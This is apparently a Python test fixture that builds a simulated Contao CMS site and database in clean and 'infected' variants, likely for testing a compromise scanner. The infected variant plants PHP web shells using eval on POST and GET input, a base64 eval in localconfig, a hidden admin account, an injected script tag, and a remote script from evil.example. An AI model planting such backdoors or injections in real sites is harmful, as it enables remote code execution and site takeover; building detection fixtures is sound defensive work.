"""Testwelt für Contao (2.11.0): eine Composer-Installation (config, vendor, public, files) und eine SQLite-Datenbank mit den Contao-Tabellen.
Nicht dasselbe wie ein echter Contao-Server (Tabellen- und Feldnamen von Hand nachgebaut)."""
import json
import os
import sqlite3
import time
from typing import Dict

from fixture import install_mysql_shim, w

SECRET = "s" * 40
ENV_GOOD = "APP_ENV=prod\nAPP_SECRET=%s\nDATABASE_URL=mysql://contao_user:GEHEIM-DB-PASSWORT@localhost:3306/contao_db\nTRUSTED_HOSTS=^www\\.testseite\\.example$\nMAILER_DSN=smtp://mailuser:GEHEIM-MAIL@mail.example:587\n" % SECRET
ENV_BAD = "APP_ENV=dev\nAPP_DEBUG=1\nAPP_SECRET=ThisTokenIsNotSoSecretChangeIt\nDATABASE_URL=mysql://contao_user:GEHEIM-DB-PASSWORT@localhost:3306/contao_db\nMAILER_DSN=smtp://mailuser:GEHEIM-MAIL@mail.example:587\n"
LOCAL_BAD = "<?php\n$GLOBALS['TL_CONFIG']['uploadTypes'] = 'jpg,gif,php,phtml,pdf';\n$GLOBALS['TL_CONFIG']['allowedTags'] = '<b><script><a>';\n$GLOBALS['TL_CONFIG']['minPasswordLength'] = 4;\n@eval(base64_decode('ZWNobyAxOw=='));\n"
SCHEMA = """
CREATE TABLE tl_user (id INTEGER PRIMARY KEY, username TEXT, admin INTEGER, disable INTEGER, dateAdded INTEGER, lastLogin INTEGER, useTwoFactor INTEGER);
CREATE TABLE tl_content (id INTEGER PRIMARY KEY, text TEXT, html TEXT);
CREATE TABLE tl_module (id INTEGER PRIMARY KEY, html TEXT);
CREATE TABLE tl_layout (id INTEGER PRIMARY KEY, head TEXT, script TEXT);
CREATE TABLE tl_article (id INTEGER PRIMARY KEY, teaser TEXT);
"""


def lock(version: str = "5.3.20") -> str:
    pk = [{"name": "contao/core-bundle", "version": version, "type": "contao-bundle"},
          {"name": "contao/manager-bundle", "version": version, "type": "contao-manager-plugin"},
          {"name": "contao/installation-bundle", "version": "5.3.1", "type": "symfony-bundle"},
          {"name": "codefog/contao-haste", "version": "v5.1.0", "type": "contao-bundle"},
          {"name": "symfony/web-profiler-bundle", "version": "v6.4.0", "type": "symfony-bundle"},
          {"name": "meine/eigene", "version": "dev-main", "type": "contao-bundle", "dist": {"type": "path"}}]
    return json.dumps({"packages": pk, "packages-dev": []}, indent=4)


def build_site(root: str, infected: bool, version: str = "5.3.20") -> str:
    site = os.path.join(root, "html", "projekt")
    os.makedirs(site, exist_ok=True)
    w(site + "/composer.lock", lock(version), days_ago=60)
    w(site + "/composer.json", "{}", days_ago=60)
    for pkg in ("core-bundle", "manager-bundle", "installation-bundle"):
        for i in range(12):
            w(site + "/vendor/contao/%s/src/Part%d.php" % (pkg, i), "<?php\n// %s %d\n" % (pkg, i), days_ago=60)
        w(site + "/vendor/contao/%s/composer.json" % pkg, "{}", days_ago=60)
    w(site + "/.env", ENV_BAD if infected else ENV_GOOD, days_ago=8 if infected else 90, mode=0o666 if infected else 0o600)
    w(site + "/config/config.yaml", "contao:\n    localconfig:\n        dateFormat: d.m.Y\n", days_ago=60)
    w(site + "/public/index.php", "<?php\n// Contao\n", days_ago=60)
    w(site + "/public/.htaccess", "Options -Indexes\n", days_ago=60)
    w(site + "/files/bild.jpg", "JFIF" + "\x00" * 40, days_ago=30)
    w(site + "/templates/a.html5", "<p>x</p>", days_ago=30)
    if infected:
        w(site + "/system/config/localconfig.php", LOCAL_BAD, days_ago=5)
        w(site + "/files/shell.php", "<?php @eval($_POST['x']); ?>", days_ago=2)
        w(site + "/vendor/contao/core-bundle/src/Backdoor.php", "<?php @eval(base64_decode($_GET['c']));", days_ago=2)
        w(site + "/vendor/contao/core-bundle/src/Part3.php", "<?php\n// geaendert\n", days_ago=2)
    return site


def build_db(path: str, infected: bool) -> None:
    if os.path.exists(path):
        os.remove(path)
    con = sqlite3.connect(path)
    con.executescript(SCHEMA)
    now = int(time.time())
    c = con.cursor()
    c.execute("INSERT INTO tl_user VALUES (1,'chef',1,0,?,?,1)", (now - 900 * 86400, now - 86400))
    c.execute("INSERT INTO tl_user VALUES (2,'redakteur',0,0,?,?,0)", (now - 300 * 86400, now - 5 * 86400))
    c.execute("INSERT INTO tl_user VALUES (3,'alt',1,1,?,?,0)", (now - 800 * 86400, now - 700 * 86400))      # gesperrter Admin zählt nicht
    c.execute("INSERT INTO tl_content VALUES (1,'<p>Willkommen</p>','')")
    if infected:
        c.execute("INSERT INTO tl_user VALUES (4,'support',1,0,?,0,0)", (now - 2 * 86400,))
        c.execute("INSERT INTO tl_content VALUES (2,'<p>x</p><script>eval(atob(\"YWxlcnQoMSk=\"))</script>','')")
        c.execute("INSERT INTO tl_module VALUES (1,'<iframe src=\"https://youtube.com/embed/x\"></iframe>')")
        c.execute("INSERT INTO tl_layout VALUES (1,'<script src=\"https://evil.example/x.js\"></script>','')")
    con.commit()
    con.close()


def make_contao_world(base: str, infected: bool = True, version: str = "5.3.20") -> Dict[str, str]:
    tag = "ct_%s_%s" % ("infected" if infected else "clean", version.replace(".", "_"))
    home = os.path.join(base, tag, "home")
    os.makedirs(home, exist_ok=True)
    site = build_site(home, infected, version)
    dbp = os.path.join(base, tag, "test.sqlite")
    build_db(dbp, infected)
    bin_dir = install_mysql_shim(os.path.join(base, tag, "bin"), dbp)
    return {"home": home, "site": site, "site_rel": "html/projekt", "db": dbp, "bin": bin_dir}
